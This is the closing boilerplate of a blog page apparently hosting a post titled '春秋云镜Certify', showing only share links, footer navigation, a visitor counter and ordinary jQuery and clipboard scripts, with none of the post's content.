  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&name=春秋云镜Certify&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&t=春秋云镜Certify"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025-2026
    Rufeii
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/tags/">tags</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
      </ul>
      <ul>
            
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
              
            
      </ul>
    </nav>
  </div>
</footer>
    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->


<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</body>
</html>
